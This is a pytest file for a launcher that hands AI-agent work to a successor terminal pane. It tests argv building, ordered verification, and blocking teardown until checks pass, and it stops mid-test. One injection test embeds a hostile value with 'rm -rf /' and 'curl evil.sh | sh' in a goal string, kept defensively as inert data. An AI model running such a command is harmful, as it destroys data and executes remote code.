"""Tests for the herdr launcher mode (#611, epic #667).

Rewritten after the Step-8a cross-model review returned FAIL on the first attempt. The two
findings that shaped this file:

1. **The first attempt was disconnected builders, not a launcher.** `handoff_plan` returned a
   step whose argv was `None`, nothing read the artifacts it named, and no non-test caller
   existed. So the centrepiece here is `TestPerformHandoff`, which drives the WIRED
   `perform_handoff` end to end through an injected runner and injected readers — proving the
   ordered sequence, the abort-at-first-failure behaviour, and that teardown really is last.
2. **Arming `/goal` at birth was falsified.** herdr rejects a control character in a native
   agent argument, and a real condition is multiline. So `build_agent_start_argv` now carries
   NO goal, and `test_agent_start_never_carries_the_goal` pins that; the goal is armed after
   readiness via the proven send-text route.

The regression that would hurt most and show least is a return to `--current`: it resolves
fine interactively and fails only under cron, i.e. only unattended, i.e. only where nobody is
watching. `test_split_never_uses_current` exists for that.
"""
from __future__ import annotations

import json
import subprocess
import sys
from pathlib import Path

import pytest

REPO_ROOT = Path(__file__).resolve().parent.parent.parent
HOOKS = REPO_ROOT / "hooks"
CLI = HOOKS / "launcher_lib.py"

if str(HOOKS) not in sys.path:
    sys.path.insert(0, str(HOOKS))

import launcher_lib as ll  # noqa: E402


class FakeProc:
    def __init__(self, returncode=0, stdout=""):
        self.returncode = returncode
        self.stdout = stdout
        self.stderr = ""


class Runner:
    """Records every argv it is handed and replays canned responses by command shape."""

    def __init__(self, responses=None, fail_on=None):
        self.calls: list[list[str]] = []
        self.responses = responses or {}
        self.fail_on = fail_on

    def key(self, argv):
        return " ".join(argv[:3])

    def __call__(self, argv, timeout=180):
        assert isinstance(argv, list) and all(isinstance(a, str) for a in argv), \
            "runner must only ever receive a list[str] argv — never a shell string"
        self.calls.append(list(argv))
        k = self.key(argv)
        if self.fail_on and k.startswith(self.fail_on):
            return FakeProc(returncode=1)
        if k == "herdr pane list" and k not in self.responses:
            # Default inventory: only the predecessor exists, so an uncertain split reconciles
            # to "nothing was created". Tests that exercise the reconcile supply their own.
            return FakeProc(0, PANE_LIST_ANCHOR_ONLY)
        return FakeProc(0, self.responses.get(k, ""))

    def kinds(self):
        return [self.key(a) for a in self.calls]


SPLIT_OK = json.dumps({"result": {"pane_id": "w1:pZZ"}})
PANE_LIST_ANCHOR_ONLY = json.dumps({"result": {"panes": [{"pane_id": "w1:p1"}]}})
# #694: a real `herdr pane get` response ALSO carries `agent_status`; this fixture omitted it, so
# every `perform_handoff` test drove a successor whose readiness could not be known. That is the
# same class of fixture unrealism the module docstring blames for letting an ordering-free prompt
# ship — see `PANE_GET_REAL` below, captured verbatim from herdr 0.7.5 on 2026-07-29.
PANE_GET_OK = json.dumps({"result": {"pane": {
    "pane_id": "w1:pZZ",
    "agent_status": "idle",
    "agent_session": {"agent": "claude", "kind": "id", "source": "herdr:claude",
                      "value": "sess-new-123"}}}})


def _pane_get(status=None, *, session="sess-new-123"):
    """A `pane get` response with an explicit `agent_status` (omitted entirely when None)."""
    pane = {"pane_id": "w1:pZZ",
            "agent_session": {"agent": "claude", "kind": "id", "source": "herdr:claude",
                              "value": session}}
    if status is not None:
        pane["agent_status"] = status
    return json.dumps({"result": {"pane": pane}})


# A REAL response, captured verbatim from the live herdr 0.7.5 server on this host (2026-07-29).
# It exists so the status parser is proven against real bytes and real key ordering, not only
# against hand-written dicts that happen to match the parser's assumptions (#694 review, F2).
PANE_GET_REAL = (REPO_ROOT / "tests" / "fixtures" / "herdr"
                 / "pane_get_idle.json").read_text(encoding="utf-8")
REGISTRY_OK = '{"session_id":"sess-new-123","project":"rawgentic"}\n'
GOAL_FIXTURE = REPO_ROOT / "tests" / "fixtures" / "herdr" / "goal_status_transcript.jsonl"
TRANSCRIPT_OK = GOAL_FIXTURE.read_text(encoding="utf-8")
GOAL_CONDITION = ("PR open with green CI, or a blocker is posted to the issue via the ERROR "
                  "protocol")
# #694: a realistic prompt for the herdr handoff path carries NO bind at all — `perform_handoff`
# sends `/rawgentic:switch <project>` as SEND 1, its own turn gated on the registry row, and refuses
# a prompt that would make the successor run the switch skill twice.
#
# This fixture has now been wrong in both directions, which is why it is commented rather than just
# edited. Originally it said only "Re-bind the project" with no directive at all, so 55
# `perform_handoff` tests passed against a prompt that could never have made `project_switched`
# succeed — the unrealism that let an ordering-free prompt ship (#682). #682 then made it open with
# the bind, which was right while the bind travelled inside the prompt. The bind now travels on its
# own, so a prompt carrying one is the unrealistic case again.
PROJECT = "rawgentic"
RESUME_PROMPT = ("Fresh-session resume: git fetch origin, read the driver-state, and run the next "
                 "ready child to full WF2 completion. Derive position from durable state.")
# The pre-#694 shape, kept so a test can prove the launcher REFUSES it rather than silently
# double-binding a successor.
RESUME_PROMPT_WITH_BIND = (
    "/rawgentic:switch rawgentic — run this FIRST, before reading any file. An unbound "
    "session cannot Read under projects/. THEN run the next child.")
REGISTRY_PATH = "/reg.jsonl"


class Artifacts:
    """Models the two on-disk artifacts as they really behave over a launch.

    #611 Step-11 Medium 4: the evidence that authorises predecessor teardown must be
    *launch-bound*. Before the launch each artifact holds whatever history it already had
    (``*_pre``); the successor's own rows appear only afterwards. ``perform_handoff`` captures a
    pre-launch offset and may only count what lands AFTER it — so seeding ``registry_pre`` with a
    matching row must NOT satisfy the check.

    ``appear_after`` is the number of reads that still return only the pre-launch content, which
    lets a test drive the bounded-polling path deterministically.
    """

    def __init__(self, registry=REGISTRY_OK, transcript=TRANSCRIPT_OK,
                 registry_pre="", transcript_pre="", appear_after=1):
        self.registry, self.transcript = registry, transcript
        self.registry_pre, self.transcript_pre = registry_pre, transcript_pre
        self.appear_after = appear_after
        self.reads: dict[str, int] = {}

    def __call__(self, path):
        n = self.reads.get(path, 0) + 1
        self.reads[path] = n
        pre, post = ((self.registry_pre, self.registry) if path == REGISTRY_PATH
                     else (self.transcript_pre, self.transcript))
        return pre + (post if n > self.appear_after else "")


def _predecessor_closed(runner) -> bool:
    """True if the PREDECESSOR pane was closed. On any failed handoff this must stay False —
    the predecessor has to remain alive AND still guarded. Closing the tentative SUCCESSOR is
    correct cleanup and is asserted separately."""
    return any(c[:3] == ["herdr", "pane", "close"] and c[3] == "w1:p1" for c in runner.calls)


def _handoff(**over):
    kw = dict(
        anchor_pane="w1:p1", cwd=str(REPO_ROOT), project_root=str(REPO_ROOT),
        name="child4", goal_condition=GOAL_CONDITION, resume_prompt=RESUME_PROMPT,
        expected_project=PROJECT, registry_path=REGISTRY_PATH,
        transcript_dir="/tmp",
        read_text=Artifacts(), sleeper=lambda _s: None,
        # #700 field defect 1: `perform_handoff` no longer carries a teardown default, because the
        # library defaulting ON while the ad-hoc CLI defaulted OFF is how the two surfaces came to
        # disagree about one operation. These tests are the ones that prove teardown is BLOCKED
        # until every check passes, so they must ASK for it — otherwise they pass vacuously.
        teardown=True,
    )
    kw.update(over)
    return kw


def _sent(runner) -> list[str]:
    """The text of every `herdr pane send-text`, in order."""
    return [c[4] for c in runner.calls if c[:3] == ["herdr", "pane", "send-text"]]


def _raise(exc):
    def reader(_path):
        raise exc
    return reader


# ---------------------------------------------------------------------------
# AC1 — the split, and the flag that must never come back
# ---------------------------------------------------------------------------

def test_split_uses_the_explicit_anchor_pane() -> None:
    argv = ll.build_split_argv(anchor_pane="w1:p1", cwd=str(REPO_ROOT),
                               project_root=str(REPO_ROOT))
    assert argv[:3] == ["herdr", "pane", "split"]
    assert argv[argv.index("--pane") + 1] == "w1:p1"


def test_split_never_uses_current() -> None:
    argv = ll.build_split_argv(anchor_pane="w1:p1", cwd=str(REPO_ROOT),
                               project_root=str(REPO_ROOT))
    assert "--current" not in argv


def test_fallback_launch_is_retained() -> None:
    argv = ll.build_fallback_launch_argv(prompt="resume", permission_mode="bypassPermissions")
    assert argv[0] == "claude" and "herdr" not in argv


# ---------------------------------------------------------------------------
# AC6 — the goal is NOT armed at birth, and truncation is never silent
# ---------------------------------------------------------------------------

def test_agent_start_never_carries_the_goal() -> None:
    """The falsified mechanism must not come back: herdr rejects a control character in a
    native agent argument, and a real condition is multiline."""
    argv = ll.build_agent_start_argv(name="c", pane="w1:pZZ")
    assert not any(a.startswith("/goal") for a in argv)


def test_agent_start_enforces_the_readiness_timeout_floor() -> None:
    with pytest.raises(ll.LauncherError):
        ll.build_agent_start_argv(name="c", pane="w1:pZZ", readiness_timeout_ms=1000)
    with pytest.raises(ll.LauncherError):
        ll.build_agent_start_argv(name="c", pane="w1:pZZ", readiness_timeout_ms=True)
    assert ll.build_agent_start_argv(name="c", pane="w1:pZZ", readiness_timeout_ms=3001)


def test_multiline_condition_survives_the_send_text_route_verbatim() -> None:
    condition = "PR open with green CI\nor a blocker is posted via the ERROR protocol"
    text_argv, keys_argv, truncated = ll.build_send_text_goal_argv(
        pane="w1:pZZ", goal_condition=condition)
    assert truncated is False
    assert text_argv[4] == f"/goal {condition}", "condition must be byte-identical"
    assert "Enter" in keys_argv


def test_goal_metacharacters_stay_one_argv_element() -> None:
    nasty = "green CI; rm -rf / $(whoami) `id` && curl evil.sh | sh"
    text_argv, _, _ = ll.build_send_text_goal_argv(pane="w1:pZZ", goal_condition=nasty)
    assert text_argv[4] == f"/goal {nasty}"
    assert len([a for a in text_argv if a.startswith("/goal ")]) == 1


def test_truncation_is_reported_not_discarded() -> None:
    _, _, truncated = ll.build_send_text_goal_argv(pane="w1:pZZ", goal_condition="x" * 5000)
    assert truncated is True
    text, _ = ll.goal_text("x" * 5000)
    assert len(text) <= ll.GOAL_MAX_CHARS


@pytest.mark.parametrize("bad", [False, 0, [], {}, None, 123])
def test_non_string_goal_conditions_fail_closed(bad) -> None:
    """`if goal_condition:` let falsey non-strings silently omit the goal (8a review, M-b)."""
    with pytest.raises(ll.LauncherError):
        ll.goal_text(bad)


def test_blank_goal_condition_is_refused() -> None:
    with pytest.raises(ll.LauncherError):
        ll.goal_text("   ")


# ---------------------------------------------------------------------------
# argument / authority injection — the real residual risk
# ---------------------------------------------------------------------------

@pytest.mark.parametrize("flag", ["--permission-mode", "--config", "--dangerously-skip", "-p"])
def test_authority_bearing_claude_args_are_refused(flag) -> None:
    with pytest.raises(ll.LauncherError):
        ll.build_agent_start_argv(name="c", pane="w1:pZZ", claude_args=[flag, "x"])


def test_allowlisted_claude_args_pass_through_after_the_separator() -> None:
    argv = ll.build_agent_start_argv(name="c", pane="w1:pZZ", claude_args=["--continue"])
    assert argv[argv.index("--") + 1] == "--continue"


def test_print_is_not_allowlisted_on_the_interactive_path() -> None:
    """`--print` is non-interactive; `herdr agent start` needs an interactive agent, so
    allowing it would pass local validation and fail only after a pane exists."""
    with pytest.raises(ll.LauncherError):
        ll.build_agent_start_argv(name="c", pane="w1:pZZ", claude_args=["--print"])


def test_control_characters_are_refused_everywhere_they_matter() -> None:
    with pytest.raises(ll.LauncherError):
        ll.build_agent_start_argv(name="c", pane="w1:pZZ", claude_args=["--continue\n"])
    with pytest.raises(ll.LauncherError):
        ll.validate_pane_id("w1:p\x01")


def test_cwd_is_confined_below_the_project_root() -> None:
    with pytest.raises(ll.LauncherError):
        ll.build_split_argv(anchor_pane="w1:p1", cwd="/etc", project_root=str(REPO_ROOT))
    with pytest.raises(ll.LauncherError):
        ll.build_split_argv(anchor_pane="w1:p1", cwd="../..", project_root=str(REPO_ROOT))
    assert ll.build_split_argv(anchor_pane="w1:p1", cwd="hooks", project_root=str(REPO_ROOT))


@pytest.mark.parametrize("bad", ["--current", "-x", "", "w1:p1 x", "w1:p1;id", "w" * 200])
def test_malformed_pane_ids_are_refused(bad) -> None:
    with pytest.raises(ll.LauncherError):
        ll.validate_pane_id(bad)


def test_pane_id_regex_rejects_unicode_digits() -> None:
    """`\\d` admitted `w١:p1`; the charset is explicit now (8a review, Low)."""
    with pytest.raises(ll.LauncherError):
        ll.validate_pane_id("w١:p1")


@pytest.mark.parametrize("bad", ["-evil", "", "a b", "x" * 200, "Child4", "9lives", "has.dot"])
def test_malformed_agent_names_are_refused(bad) -> None:
    with pytest.raises(ll.LauncherError):
        ll.validate_agent_name(bad)


# ---------------------------------------------------------------------------
# mode selection — must not hand out a successor known to be unusable
# ---------------------------------------------------------------------------

@pytest.mark.parametrize("backend,avail,supports,expected", [
    ("herdr", True, True, "herdr"),
    ("herdr", False, True, "single_session"),
    ("herdr", True, False, "single_session"),
    ("tmux", True, True, "pane_less"),
    (None, False, False, "pane_less"),
])
def test_mode_selection_matches_the_driver_lib_contract(backend, avail, supports, expected):
    """A herdr-gated project that cannot get a pane keeps the single-session loop rather than
    launching a pane-less successor that would die at its first build-seat dispatch
    (8a review, M-c; mirrors driver_lib.fresh_session_available)."""
    mode, reason = ll.select_launch_mode(terminal_backend=backend, herdr_available=avail,
                                         launcher_supports_herdr=supports)
    assert mode == expected
    assert reason.strip()


# ---------------------------------------------------------------------------
# AC7 — the readers actually read
# ---------------------------------------------------------------------------

def test_pane_agent_session_is_parsed_from_a_real_shaped_response() -> None:
    assert ll.parse_pane_agent_session(PANE_GET_OK) == "sess-new-123"


@pytest.mark.parametrize("bad", ["", "not json", "{}", json.dumps({"result": {"pane": {}}}),
                                 json.dumps({"result": {"pane": {"agent_session": {}}}})])
def test_absent_agent_session_reads_as_none_not_success(bad) -> None:
    assert ll.parse_pane_agent_session(bad) is None


def test_registry_match_requires_the_new_session_id() -> None:
    assert ll.registry_has_session(REGISTRY_OK, "sess-new-123") is True
    assert ll.registry_has_session(REGISTRY_OK, "sess-old-999") is False
    assert ll.registry_has_session("garbage\n", "sess-new-123") is False


def test_goal_armed_reads_the_REAL_transcript_shape() -> None:
    """The critical regression (#611 Step-11 High 2).

    An earlier revision matched `{"goal_status": {"met": false}}` — a shape this repo
    INVENTED, which its own tests then fed back. Against real output the check always
    returned False, so `goal_armed` could never pass and teardown could never fire. The
    fixture is real-shaped (`attachment.type == "goal_status"`), verified against live
    transcripts, so the invented shape cannot come back unnoticed.
    """
    assert ll.transcript_has_unmet_goal(TRANSCRIPT_OK) is True
    assert "\"attachment\"" in TRANSCRIPT_OK and '"type":"goal_status"' in TRANSCRIPT_OK
    met_only = "\n".join(l for l in TRANSCRIPT_OK.splitlines() if '"met":true' in l)
    assert met_only, "fixture must carry a met:true line to test against"
    assert ll.transcript_has_unmet_goal(met_only) is False, \
        "an already-met goal does not prove the successor is guarded"
    assert ll.transcript_has_unmet_goal("") is False
    assert ll.transcript_has_unmet_goal('{"goal_status":{"met":false}}') is False, \
        "the invented shape must NOT be accepted"


def test_ladder_is_ordered_and_names_on_disk_artifacts() -> None:
    """The order is CAUSAL, not alphabetical, and #694 reordered it to match the sends: the bind is
    its own send so its registry row comes first, and `/goal` goes last so `goal_armed` does too.
    Each rung is the durable artifact written by the send before it. The constraint that survives
    from the earlier revisions is the one they broke: a rung must never be checked before the send
    that produces it has actually gone out, or it can only pass on stale evidence."""
    steps = ll.handoff_verification_steps()
    assert [s["step"] for s in steps] == ["spawned", "project_switched", "goal_armed"]
    for s in steps:
        assert s["artifact"].strip()
        assert "pane text" not in s["artifact"].lower()
        assert "agent_status" not in s["artifact"], \
            "no rung may rest on pane status — it is not a synchronisation signal (#694)"


def test_ladder_aborts_at_the_first_failure() -> None:
    ok, failed, checked = ll.evaluate_verifications(
        {"spawned": True, "project_switched": False, "goal_armed": True})
    assert (ok, failed, checked) == (False, "project_switched", ["spawned", "project_switched"])


def test_missing_result_is_failure_not_pass() -> None:
    ok, failed, _ = ll.evaluate_verifications({"spawned": True})
    assert ok is False and failed == "project_switched"


def test_teardown_refused_until_every_check_passes() -> None:
    allowed, reason = ll.teardown_allowed({"spawned": True, "project_switched": True,
                                           "goal_armed": False})
    assert allowed is False and "goal_armed" in reason


# ---------------------------------------------------------------------------
# the wired path — this is what the review found missing
# ---------------------------------------------------------------------------

class TestPerformHandoff:
    def test_happy_path_runs_the_full_ordered_sequence(self) -> None:
        r = Runner({"herdr pane split": SPLIT_OK, "herdr pane get": PANE_GET_OK})
        out = ll.perform_handoff(runner=r, **_handoff())
        assert out["ok"] is True, out
        assert out["new_pane"] == "w1:pZZ"
        assert out["session_id"] == "sess-new-123"
        assert out["results"] == {"spawned": True, "goal_armed": True,
                                  "project_switched": True}
        assert r.kinds() == [
            "herdr agent list",                                 # #731 name preflight, FIRST
            "herdr pane list",                                  # pre-split inventory
            "herdr pane split", "herdr agent start", "herdr agent wait", "herdr pane get",
            "herdr pane send-text", "herdr pane send-keys",     # SEND 1 — the bind, alone
            "herdr pane send-text", "herdr pane send-keys",     # SEND 2 — the resume prompt
            "herdr pane send-text", "herdr pane send-keys",     # SEND 3 — the goal, LAST
            "herdr pane close",                                 # the predecessor, LAST of all
        ]
        assert out["cleanup"] is None, "nothing to clean up when ownership transferred"

    def test_teardown_is_the_final_call(self) -> None:
        r = Runner({"herdr pane split": SPLIT_OK, "herdr pane get": PANE_GET_OK})
        ll.perform_handoff(runner=r, **_handoff())
        assert r.kinds()[-1] == "herdr pane close"
        assert r.kinds().count("herdr pane close") == 1

    def test_goal_is_pasted_only_after_readiness(self) -> None:
        r = Runner({"herdr pane split": SPLIT_OK, "herdr pane get": PANE_GET_OK})
        ll.perform_handoff(runner=r, **_handoff())
        kinds = r.kinds()
        assert kinds.index("herdr agent wait") < kinds.index("herdr pane send-text")

    @pytest.mark.parametrize("fail_at,expected", [
        ("herdr pane split", "split"),
        ("herdr agent start", "agent_start"),
        ("herdr agent wait", "agent_wait"),
        # the FIRST send-text is now the bind (#694), so that is the step a send-text failure
        # aborts at — nothing else has been sent yet
        ("herdr pane send-text", "send_bind"),
    ])
    def test_a_failed_step_aborts_and_never_tears_down(self, fail_at, expected) -> None:
        r = Runner({"herdr pane split": SPLIT_OK, "herdr pane get": PANE_GET_OK},
                   fail_on=fail_at)
        out = ll.perform_handoff(runner=r, **_handoff())
        assert out["ok"] is False
        assert out["failed_step"] == expected
        assert not _predecessor_closed(r), \
            "the predecessor must stay alive AND guarded when the handoff fails"
        if out["new_pane"]:
            # a pane was created, so it must have been cleaned up; when the SPLIT itself
            # failed there is nothing to clean up and `cleanup` is correctly None
            assert out["cleanup"] and "closed tentative pane" in out["cleanup"], \
                f"{fail_at}: tentative successor leaked"
        else:
            assert out["cleanup"] is None

    def test_unparseable_split_response_aborts(self) -> None:
        r = Runner({"herdr pane split": "not json"})
        out = ll.perform_handoff(runner=r, **_handoff())
        assert out["ok"] is False and out["failed_step"] == "split_response_unparseable"
        # no pane id was parsed, so there is nothing to clean up and nothing to retire
        assert not _predecessor_closed(r) and out["cleanup"] is None

    def test_absent_agent_session_blocks_teardown(self) -> None:
        r = Runner({"herdr pane split": SPLIT_OK,
                    "herdr pane get": json.dumps({"result": {"pane": {}}})})
        out = ll.perform_handoff(runner=r, **_handoff())
        assert out["ok"] is False and out["failed_step"] == "spawned"
        assert not _predecessor_closed(r)

    def test_registry_without_the_new_session_blocks_teardown(self) -> None:
        r = Runner({"herdr pane split": SPLIT_OK, "herdr pane get": PANE_GET_OK})
        out = ll.perform_handoff(runner=r, **_handoff(
            read_text=Artifacts(registry='{"session_id":"someone-else"}\n')))
        assert out["ok"] is False and out["failed_step"] == "project_switched"
        assert not _predecessor_closed(r)

    def test_unarmed_goal_blocks_teardown(self) -> None:
        """`Artifacts` rather than a bare lambda: the registry evidence has to be LAUNCH-BOUND, and
        since #694 checks `project_switched` FIRST a fixture whose row is already present at
        baseline now fails there instead — hiding the goal_armed case this test is about."""
        r = Runner({"herdr pane split": SPLIT_OK, "herdr pane get": PANE_GET_OK})
        out = ll.perform_handoff(runner=r, **_handoff(read_text=Artifacts(transcript="")))
        assert out["ok"] is False and out["failed_step"] == "goal_armed"
        assert not _predecessor_closed(r)

    def test_unreadable_artifact_is_a_failure_not_a_pass(self) -> None:
        def boom(path):
            raise OSError("gone")
        r = Runner({"herdr pane split": SPLIT_OK, "herdr pane get": PANE_GET_OK})
        out = ll.perform_handoff(runner=r, **_handoff(read_text=boom))
        assert out["ok"] is False
        assert not _predecessor_closed(r)

    def test_truncation_is_surfaced_on_the_wired_path(self) -> None:
        r = Runner({"herdr pane split": SPLIT_OK, "herdr pane get": PANE_GET_OK})
        out = ll.perform_handoff(runner=r, **_handoff(goal_condition="x" * 5000))
        assert out["truncated"] is True
        note = [s for s in out["steps"] if s["kind"] == "send_text"][0]["note"]
        assert note and "TRUNCATED" in note

    def test_runner_only_ever_receives_argv_lists(self) -> None:
        """The Runner asserts this on every call; this test makes the guarantee explicit."""
        r = Runner({"herdr pane split": SPLIT_OK, "herdr pane get": PANE_GET_OK})
        ll.perform_handoff(runner=r, **_handoff())
        assert r.calls and all(isinstance(c, list) for c in r.calls)


# ---------------------------------------------------------------------------
# CLI (black-box via subprocess, per docs/testing.md)
# ---------------------------------------------------------------------------

def _cli(*args: str) -> subprocess.CompletedProcess:
    return subprocess.run([sys.executable, str(CLI), *args], capture_output=True,
                          text=True, check=False)


def test_cli_absent_capability_flag_does_not_read_as_support() -> None:
    """`store_true` with `default=True` made the flag a no-op (8a review, M-a)."""
    proc = _cli("select-mode", "--terminal-backend", "herdr", "--herdr-available")
    assert proc.returncode == 0, proc.stderr
    assert "single_session" in proc.stdout


def test_cli_with_capability_flag_selects_herdr() -> None:
    proc = _cli("select-mode", "--terminal-backend", "herdr", "--herdr-available",
                "--launcher-herdr")
    assert proc.returncode == 0 and "herdr\t" in proc.stdout


def test_cli_build_split_emits_argv_without_current() -> None:
    proc = _cli("build-split", "--anchor-pane", "w1:p1", "--cwd", str(REPO_ROOT),
                "--project-root", str(REPO_ROOT))
    assert proc.returncode == 0, proc.stderr
    assert "--current" not in json.loads(proc.stdout)


def test_cli_rejects_cwd_outside_the_project_root() -> None:
    proc = _cli("build-split", "--anchor-pane", "w1:p1", "--cwd", "/etc",
                "--project-root", str(REPO_ROOT))
    assert proc.returncode == 2 and "outside the project root" in proc.stderr


def test_cli_build_fallback_gives_the_pane_less_path_an_entry_point() -> None:
    """AC1's second half. Without this the builder had no caller at all — the disconnected
    smell the Step-8a review named."""
    proc = _cli("build-fallback", "--prompt", "resume", "--wall-timeout", "5h")
    assert proc.returncode == 0, proc.stderr
    argv = json.loads(proc.stdout)
    assert argv[:2] == ["timeout", "5h"] and "herdr" not in argv


def test_cli_goal_text_reports_truncation() -> None:
    proc = _cli("goal-text", "--condition", "x" * 5000)
    assert proc.returncode == 0
    assert json.loads(proc.stdout)["truncated"] is True


# ---------------------------------------------------------------------------
# #611 Step-11 High 1 — the production caller
# ---------------------------------------------------------------------------

# #840 — `_cmd_handoff` now observes `origin/main` UNCONDITIONALLY (Step-11 finding 1), so these
# CLI tests must not point `--project-root` at the real checkout: that would make the suite do a
# live `git fetch` per test and depend on the network. A throwaway repo with a LOCAL origin gives a
# real, observable head with no network at all.
REVAL_LOCAL_HEAD_CACHE: dict = {}


def _local_repo_with_origin(tmp_path):
    """(work_tree, head_sha) for a repository whose `origin` is a local bare clone."""
    origin, work = tmp_path / "origin.git", tmp_path / "work"
    if work.exists():
        return str(work), REVAL_LOCAL_HEAD_CACHE[str(work)]
    subprocess.run(["git", "init", "--bare", "-b", "main", str(origin)],
                   capture_output=True, check=True)
    subprocess.run(["git", "init", "-b", "main", str(work)], capture_output=True, check=True)
    for cfg in (["user.email", "t@example.com"], ["user.name", "t"]):
        subprocess.run(["git", "-C", str(work), "config", *cfg], capture_output=True, check=True)
    (work / "f.txt").write_text("one\n", encoding="utf-8")
    subprocess.run(["git", "-C", str(work), "add", "f.txt"], capture_output=True, check=True)
    subprocess.run(["git", "-C", str(work), "commit", "-m", "one"], capture_output=True, check=True)
    subprocess.run(["git", "-C", str(work), "remote", "add", "origin", str(origin)],
                   capture_output=True, check=True)
    subprocess.run(["git", "-C", str(work), "push", "-u", "origin", "main"],
                   capture_output=True, check=True)
    head = subprocess.run(["git", "-C", str(work), "rev-parse", "HEAD"],
                          capture_output=True, text=True, check=True).stdout.strip()
    REVAL_LOCAL_HEAD_CACHE[str(work)] = head
    return str(work), head


def _armed(state_dict, head):
    """Add a minimal VALID `queue_revalidation` receipt attesting `head`, and stamp every queued
    child at it — the gate is universal since #840, so a receipt-less campaign is refused."""
    claim = {"kind": "cause", "quoted_from_body": "the cause is X",
             "checked_against": f"hooks/launcher_lib.py@{head}",
             "evidence": "read at that sha; still holds", "verdict": "holds"}
    children = {}
    for issue in state_dict["issues"]:
        if issue.get("status") == "queued":
            issue["validated_against"] = head
            children[str(issue["number"])] = {
                "body_hash": "9" * 64, "from_sha": head, "to_sha": head,
                "extraction": "paths", "depth": "quick", "outcome": "still_valid",
                "claims": [dict(claim)], "validated_at": 1_754_000_000}
    state_dict["queue_revalidation"] = {"version": 1, "extractor_version": 1,
                                        "validated_head": head, "children": children}
    return state_dict


def _state(tmp_path, **over):
    state = {"campaign": "epic-667", "epic": 667, "generation": 3,
             # #682: a campaign state needs the project, or there is no valid
             # `/rawgentic:switch <project>` to head the resume prompt with.
             "project": PROJECT,
             "session_mode": "fresh-session",
             "issues": [{"number": 611, "status": "merged"},
                        {"number": 612, "status": "queued"}]}
    state.update(over)
    _work, head = _local_repo_with_origin(tmp_path)
    if "queue_revalidation" not in state:
        _armed(state, head)
    p = tmp_path / "driver-state.json"
    p.write_text(json.dumps(state), encoding="utf-8")
    return p


def _handoff_argv(state, tmp_path, **over):
    work, _head = _local_repo_with_origin(tmp_path)
    kw = {"--driver-state": str(state), "--anchor-pane": "w1:p1", "--name": "child4",
          "--project-root": work, "--project": PROJECT, "--cwd": str(REPO_ROOT),
          "--registry": "/reg.jsonl", "--transcript-dir": str(tmp_path),
          "--goal-condition": "keep going", "--launch-mode": "fresh",
          "--herdr-mode": "herdr"}
    kw.update(over)
    argv = ["handoff"]
    for k, v in kw.items():
        argv += [k] if v is None else [k, v]
    return argv


class TestHandoffCLI:
    """#611 Step-11 High 1 (conf 1.00): `rg` found no non-test invocation of `perform_handoff`
    — the module was builders nobody called. This subcommand IS the caller; the workspace
    `*-resume.sh` launcher invokes it (the launchers live outside any git repo, so the logic
    lives here where it can be tested and shipped — D-11 finding 2)."""

    @pytest.fixture(autouse=True)
    def _no_live_issue_probe(self, monkeypatch):
        """#695: `handoff` now builds a LIVE `gh api graphql` issue-state probe by default.

        These tests drive it against synthetic campaigns whose fixtures reuse issue numbers that
        really are merged in this repo (682, 687), so with the probe on, a fake `queued` queue
        resolves to a genuinely `complete` campaign and the CLI correctly refuses to hand off —
        which looked like a regression and is really the feature working on real data.

        Switched off here so these assertions test the CLI rather than GitHub's current state.
        `TestTheIssueProbeDefaultsOn` pins that production does NOT get this treatment.
        """
        monkeypatch.setenv(ll.ISSUE_PROBE_ENV, "0")

    def test_the_subcommand_exists(self) -> None:
        proc = _cli("handoff", "--help")
        assert proc.returncode == 0
        assert "--driver-state" in proc.stdout and "--anchor-pane" in proc.stdout

    def test_a_campaign_with_nothing_ready_refuses_without_touching_herdr(self, tmp_path) -> None:
        """Every child merged => `complete`, not `ready`. Splitting a pane here would spawn a
        successor with no work at all."""
        state = _state(tmp_path, issues=[{"number": 611, "status": "merged"}])
        proc = _cli(*_handoff_argv(state, tmp_path))
        assert proc.returncode == 3, proc.stderr
        assert "complete" in (proc.stdout + proc.stderr)

    @pytest.mark.parametrize("mode", ["single_session", "pane_less"])
    def test_only_the_herdr_verdict_runs_this_sequence(self, tmp_path, mode) -> None:
        """`single_session` means keep the current loop; `pane_less` means use the retained
        `claude --print` path. Accepting either here would split a pane on a project that never
        wanted one and then retire the predecessor after launching by a different mechanism
        entirely (#611 Step-11 pass-3 Medium 4)."""
        proc = _cli(*_handoff_argv(_state(tmp_path), tmp_path, **{"--herdr-mode": mode}))
        assert proc.returncode == 2, proc.stdout
        assert "invalid choice" in proc.stderr

    def test_a_single_session_campaign_is_not_handed_off(self, tmp_path) -> None:
        """A driver-state with no `session_mode` is documented to mean byte-identical
        single-session behaviour. The previous revision forced FRESH_SESSION_MODE, so it would
        have launched a successor and retired the predecessor for such a campaign
        (#611 Step-11 pass-3 High 2)."""
        state = _state(tmp_path)
        payload = json.loads(state.read_text(encoding="utf-8"))
        del payload["session_mode"]
        state.write_text(json.dumps(payload), encoding="utf-8")
        proc = _cli(*_handoff_argv(state, tmp_path))
        assert proc.returncode == 3, proc.stdout
        assert "single_session" in proc.stdout

    def test_an_unarmed_launcher_is_refused(self, tmp_path) -> None:
        """Absence of the assertion must not read as support — the same lesson the 8a review
        taught about `--launcher-herdr`."""
        proc = _cli(*_handoff_argv(_state(tmp_path), tmp_path))
        assert proc.returncode == 3, proc.stdout
        assert "launcher" in proc.stdout.lower()

    def test_a_resume_first_launcher_is_refused(self, tmp_path) -> None:
        proc = _cli(*_handoff_argv(_state(tmp_path), tmp_path, **{"--launcher-armed": None}))
        assert proc.returncode == 3, proc.stdout
        assert "fresh" in proc.stdout.lower()

    def test_the_resume_prompt_comes_from_driver_lib_not_a_hand_written_string(self,
                                                                               tmp_path) -> None:
        """AC6's sibling requirement: the successor is told to rebuild from durable state. The
        canonical wording is `driver_lib`'s, so the two cannot drift apart."""
        sys.path.insert(0, str(HOOKS))
        import driver_lib as dl  # noqa: PLC0415

        state = json.loads(_state(tmp_path).read_text(encoding="utf-8"))
        work, head = _local_repo_with_origin(tmp_path)
        # #840 — an armed campaign cannot produce a disposition without a freshly observed head;
        # the pure side takes the SHA, the launcher side takes the repo root and observes it itself.
        disposition = dl.fresh_session_handoff(state, mode=dl.FRESH_SESSION_MODE,
                                               observed_head=head)
        assert disposition["outcome"] == "ready"
        # #840 made this a result object rather than `str | None`, so a revalidation refusal
        # could stop being reported as "the epic finished". The prompt itself is unchanged.
        result = ll.resume_prompt_for_state(state, project=PROJECT, repo_root=work)
        assert result["outcome"] == "ready", result
        assert result["prompt"] == disposition["resume_prompt"]
        assert "612" in disposition["resume_prompt"]

    def test_the_condition_can_be_read_verbatim_from_a_transcript(self, tmp_path) -> None:
